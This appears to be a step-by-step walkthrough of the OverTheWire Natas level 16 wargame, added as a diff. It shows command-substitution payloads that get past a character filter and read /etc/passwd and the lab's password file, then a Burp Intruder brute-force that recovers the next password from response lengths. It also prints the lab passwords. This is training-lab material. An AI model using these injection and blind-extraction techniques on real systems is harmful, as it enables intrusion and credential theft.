@@ -1,0 +1,95 @@
+PASSWORD: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V
+
+*LEFT CLICK View sourcecode
+
+[;|&`\'"] - Input contains an illegal character!
+
+URL: http://natas16.natas.labs.overthewire.org/
+$(grep ^a /etc/passwd)one
+Output:  <-----EXECUTE
+
+abandoned
+actioned
+affectioned
+aforementioned
+alone
+anyone
+atone
+atoned
+atonement
+atonement's
+atones
+auctioned
+auctioneer
+auctioneer's
+auctioneers
+auditioned
+
+$(grep ^a /etc/passwd)gynecology
+Output:  <-----EXECUTES FEWER WORDS, SO WE WILL HAVE LESS OUTPUT TO DEAL WITH
+
+gynecology
+gynecology's
+
+*KNOWING THAT NATAS PASSWORD FILE IS LOCATED IN /ETC/NATAS_WEBPASS
+*LET'S CHECK TO SEE IF THE FIRST LETTER OF NATAS17 PASSWORD IS "a"
+
+$(grep ^a /etc/natas_webpass/natas17)gynecology
+
+Output:  <-----NO THE FIRST LETTER OF NATAS17 PASSWORD IS NOT a
+
+gynecology
+gynecology's
+
+*BURP SUITE*
+
+*TOGGLE Intercept is on
+
+URL: http://natas16.natas.labs.overthewire.org/
+$(grep ^a /etc/natas_webpass/natas17)gynecology <-----SEARCH
+
+*BURP SUITE*
+*SEND TO Intruder
+*TOGGLE Intercept is off
+
+*INTRUDER*
+GET /?needle=%24%28grep+%5Ea+%2Fetc%2Fnatas_webpass%2Fnatas17%29gynecology  <-----HIGHLIGHT THE a AFTER %5E
+
+ADD$
+
+GET /?needle=%24%28grep+%5E§a§+%2Fetc%2Fnatas_webpass%2Fnatas17%29gynecology
+
+*PAYLOADS*
+PAYLOAD SET 1
+PAYLOAD TYPE Brute forcer
+CHARACTER SET ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+MIN LENGTH 1
+MAX LENGTH 1
+
+*START ATTACK*
+*CLICK Lengnth TO FIND OUT WHICH LETTER HAS THE SHORTEST OUTPUT POST?
+
+*THE LETTER "X" HAS THE SHORTEST OUTPOST, SO "X" WILL BE THE FIRST LETTER OF NATAS17 PASSWORD*
+*CLICK Positions
+
+GET /?needle=%24%28grep+%5EX§a§+%2Fetc%2Fnatas_webpass%2Fnatas17%29gynecology  <-----INCLUDE THE LETTER X AFTER THE %5E FOR THE FIRST LETTER.
+
+*START ATTACK*
+*CLICK Lengnth TO FIND OUT WHICH LETTER HAS THE SHORTEST OUTPUT POST?
+
+*THE LETTER "k" HAS THE SHORTEST OUTPOST, SO "k" WILL BE THE SECOND LETTER OF NATAS17 PASSWORD*
+*CLICK Positions
+
+GET /?needle=%24%28grep+%5EXk§a§+%2Fetc%2Fnatas_webpass%2Fnatas17%29gynecology  <-----INCLUDE THE LETTER k AFTER THE %5EX FOR THE SECOND LETTER.
+
+*START ATTACK*
+*CLICK Lengnth TO FIND OUT WHICH LETTER HAS THE SHORTEST OUTPUT POST?
+
+*THE LETTER "E" HAS THE SHORTEST OUTPOST, SO "E" WILL BE THE THIRD LETTER OF NATAS17 PASSWORD*
+*CLICK Positions
+
+GET /?needle=%24%28grep+%5EXkE§a§+%2Fetc%2Fnatas_webpass%2Fnatas17%29gynecology  <-----INCLUDE THE LETTER E AFTER THE %5EXk FOR THE THIRD LETTER.
+
+etc.....
+
+XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd <-----PASSWORD
